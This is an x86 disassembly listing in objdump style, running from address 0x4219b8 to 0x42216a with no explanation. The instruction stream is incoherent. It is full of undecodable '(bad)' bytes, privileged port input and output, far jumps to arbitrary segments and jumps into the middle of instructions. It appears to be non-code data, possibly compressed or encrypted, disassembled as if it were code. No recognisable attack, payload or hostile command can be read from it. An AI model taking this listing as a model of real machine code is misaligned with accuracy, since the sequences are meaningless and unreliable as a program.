  4219b8:	ins    BYTE PTR es:[edi],dx
  4219b9:	push   edi
  4219ba:	add    BYTE PTR [ecx-0x3b],dl
  4219bd:	pop    ss
  4219be:	cs popf 
  4219c0:	cmc    
  4219c1:	push   es
  4219c2:	loop   0x421988
  4219c4:	dec    ebx
  4219c5:	dec    edi
  4219c6:	adc    cl,BYTE PTR [esi]
  4219c8:	push   0x435f061
  4219cd:	cmp    cl,BYTE PTR [ebx]
  4219cf:	sub    ebx,DWORD PTR [edi-0x13]
  4219d2:	push   eax
  4219d3:	shr    bl,1
  4219d5:	std    
  4219d6:	xchg   esp,eax
  4219d7:	sbb    al,0xa7
  4219d9:	add    BYTE PTR [ebx],dh
  4219db:	leave  
  4219dc:	push   esp
  4219dd:	push   0x915ea614
  4219e2:	es scas eax,DWORD PTR es:[edi]
  4219e4:	sub    eax,DWORD PTR [ecx+0xc844f21]
  4219ea:	out    dx,al
  4219eb:	cli    
  4219ec:	scas   eax,DWORD PTR es:[edi]
  4219ed:	adc    ah,bl
  4219ef:	inc    esp
  4219f0:	bswap  ebx
  4219f2:	mov    ah,0xa0
  4219f4:	cmp    eax,0xaa6e5149
  4219f9:	lds    ebp,FWORD PTR [edx]
  4219fb:	scas   al,BYTE PTR es:[edi]
  4219fc:	pop    esi
  4219fd:	pop    eax
  4219fe:	into   
  4219ff:	cmp    eax,0x66ec2f3
  421a04:	jmp    0x421a31
  421a06:	mov    ebp,0x14416d6e
  421a0b:	and    al,0x42
  421a0d:	add    eax,0x522e137
  421a12:	xor    esi,DWORD PTR [edx]
  421a14:	test   al,0x2a
  421a16:	out    0x73,eax
  421a18:	pop    eax
  421a19:	aad    0xba
  421a1b:	jb     0x421a6b
  421a1d:	fmulp  st(4),st
  421a1f:	cdq    
  421a20:	loopne 0x421a81
  421a22:	outs   dx,BYTE PTR ds:[esi]
  421a23:	in     eax,0x8a
  421a25:	mov    dh,0x14
  421a27:	pop    esp
  421a28:	out    dx,eax
  421a29:	cmp    BYTE PTR [ebx],0x8
  421a2c:	pop    ebp
  421a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a2e:	mov    edx,0xcb4c406c
  421a33:	dec    ebp
  421a34:	sub    ch,0xff
  421a37:	mov    al,ds:0x8de61467
  421a3c:	fcom   DWORD PTR [ebx-0xba1dd41]
  421a42:	std    
  421a43:	xor    dl,ah
  421a45:	sar    DWORD PTR [eax+0xc],1
  421a48:	jmp    0x4ee6:0xc3cf7f60
  421a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a50:	jbe    0x421a97
  421a52:	in     eax,dx
  421a53:	cdq    
  421a54:	xchg   edx,eax
  421a55:	and    ch,al
  421a57:	add    DWORD PTR [edi+ebp*4+0x6122892a],ebx
  421a5e:	shl    DWORD PTR [ebx],1
  421a60:	add    al,0xbb
  421a62:	je     0x421a30
  421a64:	clc    
  421a65:	rcr    DWORD PTR [esi-0xe80a18e],1
  421a6b:	push   ss
  421a6c:	sub    al,0x7b
  421a6e:	test   eax,0x3e608253
  421a73:	es enter 0x82a5,0xa7
  421a78:	cmp    DWORD PTR [edi+0x42f5c1ee],ebx
  421a7e:	out    0x7a,eax
  421a80:	or     ch,BYTE PTR [ebp-0x6d]
  421a83:	ins    DWORD PTR es:[edi],dx
  421a84:	mov    fs,WORD PTR [eax+0x2d]
  421a87:	fadd   QWORD PTR [eax]
  421a89:	int    0x20
  421a8b:	cdq    
  421a8c:	js     0x421aaf
  421a8e:	cmc    
  421a8f:	pop    eax
  421a90:	out    dx,al
  421a91:	mov    cl,0x8a
  421a93:	pop    ds
  421a94:	inc    ebx
  421a95:	loope  0x421ad3
  421a97:	cmp    al,0x11
  421a99:	aas    
  421a9a:	pushf  
  421a9b:	mov    ds:0xe1b263ff,al
  421aa0:	jmp    0xef6f:0x170e94c
  421aa7:	retf   0x2a61
  421aaa:	adc    BYTE PTR [ecx-0x1a],al
  421aad:	mov    dl,0x97
  421aaf:	shl    DWORD PTR [eax+0x60],1
  421ab2:	cmp    edx,esp
  421ab4:	aad    0xfe
  421ab6:	pop    edi
  421ab7:	iret   
  421ab8:	add    BYTE PTR [ebx-0x8],0xb8
  421abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421abd:	cli    
  421abe:	in     eax,dx
  421abf:	ffreep st(1)
  421ac1:	xchg   ebx,eax
  421ac2:	jb     0x421a85
  421ac4:	jb     0x421a7a
  421ac6:	int    0xad
  421ac8:	mov    ds:0x2d436e85,eax
  421acd:	mov    bh,0xa0
  421acf:	out    dx,eax
  421ad0:	jecxz  0x421aea
  421ad2:	in     eax,dx
  421ad3:	jecxz  0x421a5f
  421ad5:	(bad)  
  421ad6:	les    edi,FWORD PTR [ecx+0xb298ecc]
  421adc:	mov    ds:0xe2a0aa4c,al
  421ae1:	and    esp,DWORD PTR [esi+0x243cfcc4]
  421ae7:	push   ss
  421ae8:	pop    esi
  421ae9:	mov    edx,0xec9e8a0f
  421aee:	pop    es
  421aef:	sub    al,0x98
  421af1:	pop    ebp
  421af2:	xchg   DWORD PTR [ebx+0xb],ebp
  421af5:	aam    0x26
  421af7:	adc    BYTE PTR [ebx+0x5988fb40],al
  421afd:	xchg   ecx,eax
  421afe:	out    dx,al
  421aff:	add    eax,0x9f5d9e53
  421b04:	(bad)
  421b07:	mov    eax,ds:0x5dfc5a05
  421b0c:	fbld   TBYTE PTR [ebx-0x56f16533]
  421b12:	je     0x421af2
  421b14:	pop    esi
  421b15:	cmc    
  421b16:	sbb    dh,BYTE PTR [eax+0x1ff600f0]
  421b1c:	loop   0x421b5f
  421b1e:	(bad)  
  421b1f:	push   DWORD PTR [edx]
  421b21:	mov    eax,ds:0xcbb005f7
  421b26:	cmp    al,0x94
  421b28:	pop    esi
  421b29:	adc    edx,esp
  421b2b:	sub    eax,0xf67c6053
  421b30:	ss jmp 0x712abcc7
  421b36:	fdivr  QWORD PTR [esi-0x6b]
  421b39:	add    edi,DWORD PTR [ebx-0x42b6a195]
  421b3f:	mov    DWORD PTR [ebx],edx
  421b41:	xchg   ebx,eax
  421b42:	mov    ah,0xa2
  421b44:	mov    eax,ds:0xf662575f
  421b49:	mov    bl,0x71
  421b4b:	cmp    DWORD PTR ds:0xc04ced77,esi
  421b51:	sbb    al,0xcf
  421b53:	xchg   DWORD PTR [esi],ebp
  421b55:	jbe    0x421b4c
  421b57:	mov    al,ds:0xaaea465d
  421b5c:	jno    0x421bdc
  421b5e:	inc    esi
  421b5f:	and    eax,0x876efc5e
  421b64:	lods   al,BYTE PTR ds:[esi]
  421b65:	lds    esp,FWORD PTR [ebx+0x1e608329]
  421b6b:	sbb    esi,DWORD PTR [esi]
  421b6d:	push   esp
  421b6e:	pop    esi
  421b6f:	or     BYTE PTR [ecx-0x2cb24951],cl
  421b75:	pusha  
  421b76:	gs ja  0x421b8d
  421b79:	out    dx,al
  421b7a:	or     al,ah
  421b7c:	clc    
  421b7d:	pusha  
  421b7e:	pop    ds
  421b7f:	pop    ecx
  421b80:	lods   al,BYTE PTR ds:[esi]
  421b81:	je     0x421b7e
  421b83:	das    
  421b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b85:	aad    0x23
  421b87:	push   ss
  421b88:	xchg   edx,eax
  421b89:	jecxz  0x421bcc
  421b8b:	stos   DWORD PTR es:[edi],eax
  421b8c:	dec    ebx
  421b8d:	loope  0x421b44
  421b8f:	mov    ebx,0xc75cff6b
  421b94:	(bad)  
  421b95:	pop    ecx
  421b96:	div    BYTE PTR [eax-0xead2039]
  421b9c:	das    
  421b9d:	ds (bad) 
  421b9f:	scas   al,BYTE PTR es:[edi]
  421ba0:	pop    esi
  421ba1:	pop    ebp
  421ba2:	repnz in eax,0x7d
  421ba5:	adc    DWORD PTR [esi-0x4e],0x2f47522a
  421bac:	mul    DWORD PTR [edi-0x72]
  421baf:	sbb    eax,DWORD PTR [edx+0x5e6b42ca]
  421bb5:	inc    esi
  421bb6:	jp     0x421c11
  421bb8:	and    DWORD PTR [ebx+0x5d71e2c1],esp
  421bbe:	(bad)  
  421bbf:	sar    BYTE PTR [esi+0x2f],cl
  421bc2:	sbb    BYTE PTR [edi-0x6a],0x58
  421bc6:	(bad)  
  421bc7:	dec    ebp
  421bc8:	pop    esi
  421bc9:	inc    esi
  421bca:	hlt    
  421bcb:	loopne 0x421bf5
  421bcd:	jp     0x421ba9
  421bcf:	push   edi
  421bd0:	jns    0x421c32
  421bd2:	repz clc 
  421bd4:	and    edx,DWORD PTR [edx-0x14]
  421bd7:	sar    BYTE PTR [ebx+0x3404edd3],1
  421bdd:	ret    
  421bde:	es out 0x64,al
  421be1:	dec    ebp
  421be2:	inc    edx
  421be3:	ror    DWORD PTR [ecx+eiz*2-0x41],cl
  421be7:	test   BYTE PTR [esi*2+0x22f14535],0xdf
  421bef:	retf   0x6463
  421bf2:	jo     0x421c2a
  421bf4:	ins    BYTE PTR es:[edi],dx
  421bf5:	repnz inc ebx
  421bf7:	jg     0x421b9f
  421bf9:	loopne 0x421c09
  421bfb:	and    ch,dl
  421bfd:	lea    esp,[edx-0x243e89e8]
  421c03:	aaa    
  421c04:	out    dx,al
  421c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c06:	out    0xff,eax
  421c08:	sbb    BYTE PTR [eax+0x504e61b6],ch
  421c0e:	add    eax,0x6f62dadf
  421c13:	mov    al,0x5e
  421c15:	nop
  421c16:	mov    al,ds:0xe9a0e9c4
  421c1b:	or     ebx,DWORD PTR [esi+0x6]
  421c1e:	xchg   esi,eax
  421c1f:	inc    ecx
  421c20:	aad    0xc3
  421c22:	pop    eax
  421c23:	in     al,dx
  421c24:	push   eax
  421c25:	popa   
  421c26:	out    0x68,al
  421c28:	dec    cx
  421c2a:	mov    ch,0x8f
  421c2c:	cmp    dh,BYTE PTR [ecx-0x17]
  421c2f:	(bad)  
  421c30:	adc    esp,ecx
  421c32:	or     al,0xb6
  421c34:	fisubr WORD PTR [ebx+0x1a]
  421c37:	sub    cl,BYTE PTR ds:0xea9b9161
  421c3d:	pop    ecx
  421c3e:	aaa    
  421c3f:	repz sahf 
  421c41:	dec    edi
  421c42:	out    dx,al
  421c43:	and    bl,BYTE PTR [ecx-0x7a]
  421c46:	(bad)  
  421c47:	xor    dl,cl
  421c49:	fsub   DWORD PTR [edx+0x3fe47a1]
  421c4f:	mov    ds:0xa6dec2a4,al
  421c54:	pop    esi
  421c55:	xor    al,0x3f
  421c57:	mov    dl,0x0
  421c59:	jl     0x421c85
  421c5b:	ja     0x421ccc
  421c5d:	push   ecx
  421c5e:	(bad)  
  421c5f:	inc    ebp
  421c60:	clc    
  421c61:	ret    
  421c62:	push   cs
  421c63:	mov    ebx,0x5fc52f9d
  421c68:	pop    esi
  421c69:	std    
  421c6a:	jns    0x421bf7
  421c6c:	cmp    eax,0x536d0b5f
  421c71:	and    eax,0x6988c587
  421c76:	sbb    DWORD PTR [edi+ecx*2+0x765e6e71],0x5e8c7b44
  421c81:	shr    BYTE PTR [ecx-0xd],1
  421c84:	dec    esp
  421c85:	je     0x421c5f
  421c87:	add    dl,BYTE PTR [ecx]
  421c89:	mov    ch,0x0
  421c8b:	mov    eax,ds:0xf5f5144d
  421c90:	xchg   edi,eax
  421c91:	add    BYTE PTR [ebx],0xab
  421c94:	xor    eax,0xde1fe1e8
  421c99:	repnz inc DWORD PTR [eax+0x21a8ad4]
  421ca0:	mov    bh,0x43
  421ca2:	ds imul edx,ecx,0x2def91c
  421ca9:	call   0x9d19:0x5df29108
  421cb0:	outs   dx,BYTE PTR ds:[esi]
  421cb1:	lahf   
  421cb2:	out    dx,al
  421cb3:	imul   edi,esp,0x47d1024c
  421cb9:	cmp    al,0x22
  421cbb:	mov    eax,ds:0x50df03a5
  421cc0:	push   ss
  421cc1:	pop    ebp
  421cc2:	and    DWORD PTR [edi],edx
  421cc4:	cmp    cl,dl
  421cc6:	cmp    ah,BYTE PTR [ecx]
  421cc8:	retf   0xc49c
  421ccb:	push   0x33
  421ccd:	loop   0x421ca1
  421ccf:	mov    al,ds:0x4906c287
  421cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cd5:	shl    ecx,0xb9
  421cd8:	pop    esi
  421cd9:	lea    eax,[edi+0x4f]
  421cdc:	mov    ah,0x52
  421cde:	shl    DWORD PTR [esi+0x65],1
  421ce1:	pop    edx
  421ce2:	xor    dh,BYTE PTR [ecx+0x4fba4cb9]
  421ce8:	sahf   
  421ce9:	inc    esp
  421cea:	adc    al,0x56
  421cec:	xchg   ebx,eax
  421ced:	mov    esi,0x21ccc0ed
  421cf2:	(bad)  
  421cf4:	sbb    DWORD PTR [ebx],0x60c2ed52
  421cfa:	sub    ch,BYTE PTR [ebp+0x2ab19c18]
  421d00:	pushf  
  421d01:	sub    ch,ch
  421d03:	test   BYTE PTR [eax+0x445249cd],dl
  421d09:	stc    
  421d0a:	pop    ebp
  421d0b:	jo     0x421c93
  421d0d:	add    DWORD PTR [ecx-0x5c],esi
  421d10:	or     eax,0xfb14cdf2
  421d15:	xchg   BYTE PTR [esi-0x118a617f],ah
  421d1b:	cs es inc edi
  421d1e:	dec    edi
  421d1f:	(bad)  
  421d20:	push   ebx
  421d21:	push   es
  421d22:	pusha  
  421d23:	mov    eax,ds:0xad8eee38
  421d28:	jb     0x421d50
  421d2a:	inc    esp
  421d2b:	and    ebx,DWORD PTR [ebx-0x1a]
  421d2e:	outs   dx,BYTE PTR ds:[esi]
  421d2f:	stos   BYTE PTR es:[edi],al
  421d30:	out    0x2b,eax
  421d32:	outs   dx,BYTE PTR ds:[esi]
  421d33:	iret   
  421d34:	call   0x9fd0:0xc9a0e1fa
  421d3b:	sub    cl,ch
  421d3d:	jb     0x421cc9
  421d3f:	xor    ebx,DWORD PTR [esi-0x66]
  421d42:	pop    esp
  421d43:	call   0x609:0x4de4f40c
  421d4a:	sbb    esp,DWORD PTR [ecx]
  421d4c:	cmp    ah,dl
  421d4e:	inc    edi
  421d4f:	jo     0x421daf
  421d51:	fidivr WORD PTR [edx]
  421d53:	jge    0x421d00
  421d55:	addr16 push eax
  421d57:	bound  edi,QWORD PTR [ecx+edx*2-0x6374a90e]
  421d5e:	dec    esi
  421d5f:	xor    DWORD PTR [eax+0x67],edx
  421d62:	jl     0x421d18
  421d64:	pop    esi
  421d65:	push   esi
  421d66:	adc    BYTE PTR [ecx-0x342e4742],0x2
  421d6d:	push   edx
  421d6e:	std    
  421d6f:	pusha  
  421d70:	add    eax,0x15120e2e
  421d75:	and    DWORD PTR [eax+0x26785d56],esi
  421d7b:	test   BYTE PTR ds:[esi],ch
  421d7e:	sub    al,0x19
  421d80:	xlat   BYTE PTR ds:[ebx]
  421d82:	call   0x2556:0xf4ee4a1
  421d89:	pop    esp
  421d8a:	jecxz  0x421dcd
  421d8c:	pop    esi
  421d8d:	pop    ebp
  421d8e:	push   0xfffffffd
  421d90:	xlat   BYTE PTR ds:[ebx]
  421d91:	(bad)  
  421d92:	push   esp
  421d93:	repnz popa 
  421d95:	popa   
  421d96:	sub    eax,DWORD PTR [ebx+eax*1+0x12]
  421d9a:	es addr16 (bad) 
  421d9d:	in     eax,dx
  421d9e:	out    0x73,eax
  421da0:	rol    dh,1
  421da2:	loopne 0x421da9
  421da4:	retf   0x6787
  421da7:	mov    cl,0xde
  421da9:	mov    esi,esi
  421dab:	mov    eax,0x255c615f
  421db0:	lahf   
  421db1:	fbld   TBYTE PTR [ebx+0x10]
  421db4:	mov    ds:0xd96f25c4,al
  421db9:	loopne 0x421d8b
  421dbb:	enter  0x1687,0x6e
  421dbf:	fisubr DWORD PTR [esi+edi*4]
  421dc2:	pop    edx
  421dc3:	mov    bl,0x70
  421dc5:	xor    BYTE PTR [ecx+0x61],dl
  421dc8:	jp     0x421e25
  421dca:	(bad)  
  421dcb:	imul   ecx,DWORD PTR [eax+edi*1-0x12],0xf72c4fdb
  421dd3:	sub    DWORD PTR [edx-0x13],0xffffffcb
  421dd7:	js     0x421d90
  421dd9:	sub    al,0x99
  421ddb:	test   eax,0xf56ea6dc
  421de0:	pop    es
  421de1:	jecxz  0x421dba
  421de3:	add    al,0xa6
  421de5:	and    al,0xee
  421de7:	ds call 0x827cf918
  421ded:	inc    edx
  421dee:	xchg   edi,eax
  421def:	lods   al,BYTE PTR ds:[esi]
  421df0:	dec    esi
  421df1:	mov    esp,0x1581146e
  421df6:	jp     0x421e31
  421df8:	cwde   
  421df9:	adc    dh,ch
  421dfb:	loop   0x421e16
  421dfd:	sbb    eax,0xe1f8cb05
  421e02:	sub    BYTE PTR [ecx-0x3b93e858],ah
  421e08:	in     al,dx
  421e09:	xchg   ebp,eax
  421e0a:	jns    0x421e2c
  421e0c:	and    bh,bl
  421e0e:	push   cs
  421e0f:	mov    eax,ds:0x26fc0edd
  421e14:	enter  0x67bc,0xf2
  421e18:	cmp    DWORD PTR [edx-0x7d],edx
  421e1b:	lods   eax,DWORD PTR ds:[esi]
  421e1c:	cmp    BYTE PTR [ecx],ah
  421e1e:	ret    0x5ca0
  421e21:	or     al,0xe6
  421e23:	cmc    
  421e24:	pop    edx
  421e25:	cmc    
  421e26:	out    dx,al
  421e27:	iret   
  421e28:	adc    al,0xb8
  421e2a:	push   ecx
  421e2b:	jb     0x421e33
  421e2d:	clc    
  421e2e:	and    BYTE PTR [ecx-0x7ce6c84f],0xdd
  421e35:	push   edi
  421e36:	lahf   
  421e37:	inc    eax
  421e38:	cmp    BYTE PTR [ebx-0x3838f30a],al
  421e3e:	scas   al,BYTE PTR es:[edi]
  421e3f:	out    0x70,al
  421e41:	push   edx
  421e42:	sbb    al,0xd3
  421e44:	add    ah,BYTE PTR [ecx+0x30]
  421e47:	inc    ebx
  421e48:	jnp    0x421e65
  421e4a:	xchg   DWORD PTR [esi],edx
  421e4c:	je     0x421ec2
  421e4e:	in     eax,dx
  421e4f:	sbb    eax,0x7bcde391
  421e54:	xor    dl,BYTE PTR [edx+eiz*2]
  421e57:	xor    eax,0x5ff260e7
  421e5c:	sbb    BYTE PTR [ecx],cl
  421e5e:	sub    ah,0xf0
  421e61:	inc    esp
  421e62:	out    dx,al
  421e63:	ficomp WORD PTR [edx+0x7c2b56e8]
  421e69:	ja     0x421ebe
  421e6b:	mov    eax,ds:0x5bb3ec1
  421e70:	in     eax,0x9e
  421e72:	mov    ds:0xc6685e43,al
  421e77:	ins    BYTE PTR es:[edi],dx
  421e78:	pop    esp
  421e79:	test   DWORD PTR [edi-0x7c],edx
  421e7c:	frstor [eax-0x24]
  421e7f:	call   0x70fe:0xa9919223
  421e86:	out    dx,al
  421e87:	xor    eax,0x162d27f8
  421e8c:	loop   0x421e85
  421e8e:	bound  esp,QWORD PTR [ecx+0x2927bb1]
  421e94:	jmp    0x78c04da2
  421e99:	ss es jns 0x421e65
  421e9d:	pusha  
  421e9e:	lea    esp,[esp+edx*4]
  421ea1:	mov    eax,esp
  421ea3:	dec    edi
  421ea4:	fldenv [eax-0xe]
  421ea7:	pop    ebx
  421ea8:	loopne 0x421ee2
  421eaa:	mov    esp,0xee6fddb6
  421eaf:	cmp    ah,BYTE PTR [ebp+0x13]
  421eb2:	jne    0x421f0e
  421eb4:	dec    esi
  421eb5:	jp     0x421f2a
  421eb7:	mov    ecx,0xa1286337
  421ebc:	mov    esi,0x1dc28923
  421ec1:	sub    DWORD PTR [ecx+0x1],eax
  421ec4:	aaa    
  421ec5:	lahf   
  421ec6:	fldenv [eax]
  421ec8:	in     al,0xb7
  421eca:	mov    ds:0x5fc9898c,eax
  421ecf:	call   0x60e9:0x8e8ee547
  421ed6:	lock dec ebp
  421ed8:	mov    dh,0x9a
  421eda:	or     al,0xa1
  421edc:	les    ebp,FWORD PTR [eax]
  421ede:	fwait
  421edf:	int    0x37
  421ee1:	pop    es
  421ee2:	sar    BYTE PTR [ecx-0x78ed88a5],1
  421ee8:	(bad)  
  421ee9:	test   al,0xe
  421eeb:	out    dx,al
  421eec:	lock mov ds:0xd874a105,eax
  421ef2:	cmc    
  421ef3:	jmp    0x421ef2
  421ef5:	mov    cl,0x1b
  421ef7:	adc    bl,BYTE PTR [esi-0x31]
  421efa:	or     eax,0xb518ee21
  421eff:	jmp    FWORD PTR [edx]
  421f01:	push   ebp
  421f02:	inc    edx
  421f03:	xor    ch,BYTE PTR [edi+ebx*1]
  421f06:	mov    ?,WORD PTR [esi]
  421f08:	addr16 in eax,0xc
  421f0b:	pushf  
  421f0c:	cld    
  421f0d:	pop    edi
  421f0e:	ss aaa 
  421f10:	xchg   esi,eax
  421f11:	fldcw  WORD PTR [esi+0xff0be4e]
  421f17:	mov    gs,ecx
  421f19:	cmovae esp,DWORD PTR [ecx]
  421f1c:	sbb    al,0xff
  421f1e:	inc    ecx
  421f1f:	mov    esp,0x3cee9060
  421f24:	ins    DWORD PTR es:[edi],dx
  421f25:	sub    eax,0xf02ec39c
  421f2a:	push   edi
  421f2b:	jg     0x421fa9
  421f2d:	pop    edi
  421f2e:	add    BYTE PTR [edi+esi*4],bh
  421f31:	outs   dx,DWORD PTR ds:[esi]
  421f32:	(bad)  
  421f33:	arpl   WORD PTR [eax+edi*4-0x69136a36],di
  421f3a:	and    ch,ah
  421f3c:	and    eax,0x4f5f37f
  421f42:	sbb    DWORD PTR [eax-0x30],0xc2232352
  421f49:	repz in eax,dx
  421f4b:	jmp    0xcf94:0x4921af96
  421f52:	out    dx,eax
  421f53:	or     eax,DWORD PTR [edx+0x47e1311a]
  421f59:	add    BYTE PTR [ecx],dh
  421f5b:	sub    al,0xfb
  421f5d:	jb     0x421fdd
  421f5f:	push   edx
  421f60:	or     al,0x4f
  421f62:	pop    ebp
  421f63:	lahf   
  421f64:	jbe    0x421efc
  421f66:	dec    esi
  421f67:	std    
  421f68:	(bad)  
  421f69:	sub    DWORD PTR [edi],ebp
  421f6b:	inc    edi
  421f6c:	pop    edx
  421f6d:	sbb    BYTE PTR [ebx+0x2efbeaf1],0x66
  421f74:	sti    
  421f75:	stos   DWORD PTR es:[edi],eax
  421f76:	out    0xa0,al
  421f78:	in     al,dx
  421f79:	out    0x99,al
  421f7b:	pop    eax
  421f7c:	xor    ebx,eax
  421f7e:	aad    0x62
  421f80:	push   esp
  421f81:	mov    ebx,0xf91b6f7d
  421f86:	push   ebp
  421f87:	popa   
  421f88:	push   cs
  421f89:	pushf  
  421f8a:	dec    ebp
  421f8b:	xchg   ebx,eax
  421f8c:	daa    
  421f8d:	mov    cx,0x62a9
  421f91:	imul   ebx,DWORD PTR [edi],0xffffffb9
  421f94:	fadd   QWORD PTR [edx-0x4a13821]
  421f9a:	mov    esi,0x317c0278
  421f9f:	aas    
  421fa0:	into   
  421fa1:	pusha  
  421fa2:	fld    TBYTE PTR [edx+0x41017f17]
  421fa8:	es and dh,ch
  421fab:	fstp   QWORD PTR [eax]
  421fad:	pop    ebx
  421fae:	addr16 and eax,0xa02338e9
  421fb4:	xlat   BYTE PTR ds:[ebx]
  421fb5:	sahf   
  421fb6:	dec    ebp
  421fb7:	cwde   
  421fb8:	jnp    0x421fa5
  421fba:	mov    al,ds:0x7935cc41
  421fbf:	inc    edi
  421fc0:	pop    esi
  421fc1:	aas    
  421fc2:	out    0xbe,al
  421fc4:	es jnp 0x422000
  421fc7:	scas   al,BYTE PTR es:[edi]
  421fc8:	mov    eax,DWORD PTR [ebx+0x53]
  421fcb:	mov    ebx,0xe17ec20d
  421fd0:	test   DWORD PTR [ebp+0x11],ebp
  421fd3:	out    dx,al
  421fd4:	aad    0x4f
  421fd6:	add    cl,cl
  421fd8:	push   ecx
  421fd9:	and    eax,0x4edbd43f
  421fde:	sti    
  421fdf:	sub    al,0xde
  421fe1:	xchg   DWORD PTR [edi],ebx
  421fe3:	popa   
  421fe4:	out    0x29,eax
  421fe6:	mov    eax,ds:0x24613d6b
  421feb:	sti    
  421fec:	jg     0x421fb7
  421fee:	ins    DWORD PTR es:[edi],dx
  421fef:	dec    esi
  421ff0:	stos   DWORD PTR es:[edi],eax
  421ff1:	stos   DWORD PTR es:[edi],eax
  421ff2:	out    dx,al
  421ff3:	pushf  
  421ff4:	js     0x42200b
  421ff6:	xor    BYTE PTR [ebp-0x5e8edf2e],ah
  421ffc:	leave  
  421ffd:	mov    al,BYTE PTR [esi+0x4141d317]
  422003:	ficomp DWORD PTR [ebx+0x5]
  422006:	add    al,0x37
  422008:	push   ebp
  422009:	fs jge 0x421fbe
  42200c:	(bad)  
  42200d:	fmul   QWORD PTR [esi]
  42200f:	dec    edi
  422010:	rcl    DWORD PTR [ecx-0x59],0x8
  422014:	adc    dh,ah
  422016:	mov    fs,ebp
  422018:	pop    ds
  422019:	jns    0x421fa9
  42201b:	(bad)  
  42201c:	pop    esi
  42201d:	add    esi,0xffffffbc
  422020:	mov    ebx,0x13b09430
  422025:	popa   
  422026:	mov    dl,0xca
  422028:	outs   dx,DWORD PTR ds:[esi]
  422029:	(bad)  
  42202a:	mov    ecx,0xee9c9c50
  42202f:	xor    edi,esi
  422031:	jmp    0x12400165
  422036:	push   0x84d3258f
  42203b:	popa   
  42203c:	or     al,0x6
  42203e:	ret    0xd7d8
  422041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422042:	add    DWORD PTR [esi+0x65],eax
  422045:	jg     0x422075
  422047:	mov    eax,0x75b97dd4
  42204c:	pusha  
  42204d:	popa   
  42204e:	stos   DWORD PTR es:[edi],eax
  42204f:	jb     0x422079
  422051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422052:	push   ebp
  422053:	aad    0x87
  422055:	jecxz  0x422045
  422057:	cmp    DWORD PTR [ecx+0x5c],esi
  42205a:	(bad)  
  42205b:	aaa    
  42205c:	repnz mov bh,ah
  42205f:	mov    eax,ds:0xc440eab7
  422064:	dec    eax
  422065:	les    esi,FWORD PTR [edx+0x1]
  422068:	inc    eax
  422069:	jo     0x422059
  42206b:	shl    dh,0x8c
  42206e:	out    0xce,eax
  422070:	pop    ecx
  422071:	adc    al,0xd9
  422073:	mov    al,ds:0x8aebd5d5
  422078:	in     eax,0xe9
  42207a:	clc    
  42207b:	(bad)  
  42207c:	push   ebx
  42207d:	and    eax,0x9b9e0408
  422082:	or     DWORD PTR fs:[edx],esi
  422085:	repz call 0xef068c33
  42208b:	rcl    DWORD PTR [esi-0x75],1
  42208e:	lock pop ecx
  422090:	lods   eax,DWORD PTR ds:[esi]
  422091:	rcr    DWORD PTR [edi],1
  422093:	mov    bl,0xba
  422095:	pusha  
  422096:	into   
  422097:	sar    BYTE PTR [ebx+esi*4+0x57],1
  42209b:	cmp    ebp,ecx
  42209d:	pop    edi
  42209e:	fcom   st(7)
  4220a0:	dec    esi
  4220a1:	adc    al,0x26
  4220a3:	das    
  4220a4:	and    al,0x71
  4220a6:	lods   al,BYTE PTR ds:[esi]
  4220a7:	push   ebp
  4220a8:	pop    esi
  4220a9:	int    0x19
  4220ab:	clc    
  4220ac:	dec    ebp
  4220ad:	test   al,0xb9
  4220af:	mov    dh,BYTE PTR [edi]
  4220b1:	popa   
  4220b2:	in     al,0xf
  4220b4:	das    
  4220b5:	(bad)  
  4220b6:	mov    cs,edi
  4220b8:	(bad)
  4220bb:	mov    esp,0xd151fa51
  4220c0:	fiadd  DWORD PTR [ecx+0x27]
  4220c3:	mov    eax,ds:0xdadbc950
  4220c8:	jbe    0x42212c
  4220ca:	iret   
  4220cb:	out    0x5e,eax
  4220cd:	(bad)  
  4220ce:	ds cwde 
  4220d0:	cmp    eax,0x4a83b197
  4220d5:	popa   
  4220d6:	xor    eax,0x70506bfa
  4220db:	sbb    bl,bl
  4220dd:	xchg   ecx,eax
  4220de:	dec    edx
  4220df:	addr16 pop edi
  4220e1:	add    DWORD PTR [ebp+0x68d5cc9f],0xffffffa1
  4220e8:	adc    ch,BYTE PTR [ecx+0xc]
  4220eb:	in     al,0x5a
  4220ed:	test   dh,ah
  4220ef:	rcr    DWORD PTR [esi+0x2b],0x4d
  4220f3:	push   ds
  4220f4:	int    0x73
  4220f6:	gs je  0x4220fe
  4220f9:	popa   
  4220fa:	rol    BYTE PTR [esi-0x22],0xb4
  4220fe:	scas   eax,DWORD PTR es:[edi]
  4220ff:	jns    0x42216c
  422101:	ja     0x4220f2
  422103:	shl    BYTE PTR [edi+ecx*2+0x1f7f4108],1
  42210a:	sub    bl,BYTE PTR [eax-0x6ca0a26c]
  422110:	push   ebp
  422111:	fdiv   DWORD PTR [edi+0x559ec627]
  422117:	lods   eax,DWORD PTR ds:[esi]
  422118:	pop    esi
  422119:	jnp    0x422196
  42211b:	fstp   st(5)
  42211d:	sbb    bl,BYTE PTR [eax+0x45]
  422120:	mov    esp,0x31837760
  422125:	lock jl 0x42218a
  422128:	retf   0xe7bc
  42212b:	or     BYTE PTR [edx-0x1196dd01],al
  422131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422132:	jmp    0x42214b
  422134:	xor    BYTE PTR [ecx+0x59],ah
  422137:	jmp    FWORD PTR [edi+0x5]
  42213a:	inc    edx
  42213b:	and    al,0x81
  42213d:	dec    esp
  42213e:	out    dx,al
  42213f:	jno    0x42211b
  422141:	enter  0xe1da,0x5d
  422145:	mov    ebx,0xfbc2a19c
  42214a:	std    
  42214b:	pop    ebx
  42214c:	push   ebx
  42214d:	sub    DWORD PTR [esi+0x2b],esi
  422150:	jp     0x422132
  422152:	out    dx,al
  422153:	sti    
  422154:	push   ecx
  422155:	sar    ah,1
  422157:	(bad)  
  422158:	aam    0x71
  42215a:	mov    cl,0xa3
  42215c:	nop
  42215d:	cmp    eax,0x502ffe49
  422162:	ds daa 
  422164:	mov    ebx,0x578feed3
  422169:	cld    
  42216a:	daa    
